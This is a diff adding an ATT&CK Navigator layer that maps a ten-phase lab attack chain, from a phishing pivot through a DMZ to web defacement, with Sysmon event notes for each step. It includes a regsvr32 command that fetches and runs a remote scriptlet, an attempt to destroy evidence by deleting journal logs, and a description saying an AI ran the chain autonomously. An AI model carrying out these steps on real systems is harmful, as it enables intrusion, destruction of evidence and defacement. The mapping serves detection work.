@@ -1,0 +1,153 @@
+{
+    "name": "AGC-079 -- Full Attack Chain: DMZ Pivot to External Defacement",
+    "versions": {
+        "attack": "16",
+        "navigator": "4.9.5",
+        "layer": "4.5"
+    },
+    "domain": "enterprise-attack",
+    "description": "Execution & Documentation Note: This scenario was executed and documented in full by Claude (Anthropic AI), operating autonomously on the lab infrastructure. | AGC-079: 10-phase cross-environment attack chain. Verdict: True Positive, Confidence: High.",
+    "filters": {
+        "platforms": ["Windows", "Linux"]
+    },
+    "sorting": 0,
+    "layout": {
+        "layout": "side",
+        "aggregateFunction": "average",
+        "showID": true,
+        "showName": true,
+        "showAggregateScores": false,
+        "countUnscored": false,
+        "expandedSubtechniques": "none"
+    },
+    "hideDisabled": false,
+    "techniques": [
+        {
+            "techniqueID": "T1566.002",
+            "tactic": "initial-access",
+            "color": "#8ec843ff",
+            "comment": "AGC-079 Phase 1: Lookalike domain ashford-grove-support.local phishing. DNS EID 22 + HTTP GET/POST EID 3 to 10.10.40.10.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        },
+        {
+            "techniqueID": "T1218.010",
+            "tactic": "defense-evasion",
+            "color": "#ff6666ff",
+            "comment": "AGC-079 Phase 2: regsvr32.exe /s /n /u /i:http://10.10.40.10/stage2.sct scrobj.dll. Access denied by Defender. No EID 1 generated.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 50
+        },
+        {
+            "techniqueID": "T1546.003",
+            "tactic": "persistence",
+            "color": "#8ec843ff",
+            "comment": "AGC-079 Phase 3: WMI Event Subscription triad. EID 19 (AGC079UpdateFilter), EID 20 (AGC079UpdateConsumer), EID 21 (binding). Fileless persistence.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        },
+        {
+            "techniqueID": "T1552.001",
+            "tactic": "credential-access",
+            "color": "#ffe766ff",
+            "comment": "AGC-079 Phase 4: Discovered C:\\Scripts\\dmz-maintenance.ps1 + SSH key. EID 1 cmd.exe dir enumeration. Weakest evidential link.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 75
+        },
+        {
+            "techniqueID": "T1021.004",
+            "tactic": "lateral-movement",
+            "color": "#ffe766ff",
+            "comment": "AGC-079 Phase 5: SSH pivot to DMZ using discovered key. Simulated (DMZ-LINUX-01 GA broken). Evidence: auth.log + firewall logs in production.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 75
+        },
+        {
+            "techniqueID": "T1548.003",
+            "tactic": "privilege-escalation",
+            "color": "#8ec843ff",
+            "comment": "AGC-079 Phase 6: NOPASSWD sudo escalation. Confirmed uid=0(root). Sudoers: kaliadmin ALL=(ALL) NOPASSWD:ALL.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        },
+        {
+            "techniqueID": "T1571",
+            "tactic": "command-and-control",
+            "color": "#ff6666ff",
+            "comment": "AGC-079 Phase 7: C2 beaconing on port 8443. 3 attempts, connection refused (no listener). Non-standard port for firewall evasion.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": false,
+            "score": 50
+        },
+        {
+            "techniqueID": "T1005",
+            "tactic": "collection",
+            "color": "#ffe766ff",
+            "comment": "AGC-079 Phase 8: Collected /etc/passwd, webroot listing, nginx.conf. Archived to dmz_collect.tar.gz (740 bytes).",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": false,
+            "score": 75
+        },
+        {
+            "techniqueID": "T1070.002",
+            "tactic": "defense-evasion",
+            "color": "#8ec843ff",
+            "comment": "AGC-079 Phase 9: journalctl vacuum deleted 7.8MB archived journals. auth.log absent (Kali uses journald). Evidence destruction confirmed.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        },
+        {
+            "techniqueID": "T1491.002",
+            "tactic": "impact",
+            "color": "#8ec843ff",
+            "comment": "AGC-079 Phase 10: Overwrote /var/www/html/index.html with defacement page. Original Acme Corp Portal replaced.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        }
+    ],
+    "gradient": {
+        "colors": ["#ff6666ff", "#ffe766ff", "#8ec843ff"],
+        "minValue": 0,
+        "maxValue": 100
+    },
+    "legendItems": [
+        { "label": "Confidence: Medium", "color": "#ff6666ff" },
+        { "label": "Confidence: High", "color": "#ffe766ff" },
+        { "label": "Confidence: Critical", "color": "#8ec843ff" }
+    ],
+    "metadata": [],
+    "links": [],
+    "showTacticRowBackground": false,
+    "tacticRowBackground": "#dddddd",
+    "selectTechniquesAcrossTactics": true,
+    "selectSubtechniquesWithParent": false,
+    "selectVisibleTechniques": false
+}
